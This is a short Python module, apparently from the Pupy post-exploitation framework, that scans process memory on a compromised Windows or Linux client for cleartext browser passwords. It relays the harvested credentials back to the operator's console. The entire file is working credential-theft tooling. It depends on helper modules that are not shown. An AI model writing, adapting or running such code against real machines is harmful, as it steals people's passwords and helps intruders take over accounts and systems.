# -*- coding: UTF8 -*-
# Thanks to Dan McInerney for its net-creds project
# Github: https://github.com/DanMcInerney/net-creds
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdio
import os
import datetime

__class_name__="LootMemory"

@config(cat="creds", compat=["windows", "linux"])
class LootMemory(PupyModule):
    """ 
        crawl processes memory and look for cleartext credentials
    """
    dependencies=['memorpy', 'loot_memory', 'psutil']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='loot_memory', description=self.__doc__)

    def run(self, args):
        with redirected_stdio(self.client.conn):
            loot=self.client.conn.modules["loot_memory"].dump_browser_passwords()
            for browser, dic in loot.iteritems():
                self.info("%s crawled :"%browser)
                for i, passwords in dic.iteritems():
                    self.success("%s:\n\t%s"%(i, '\n\t'.join(passwords)))
            
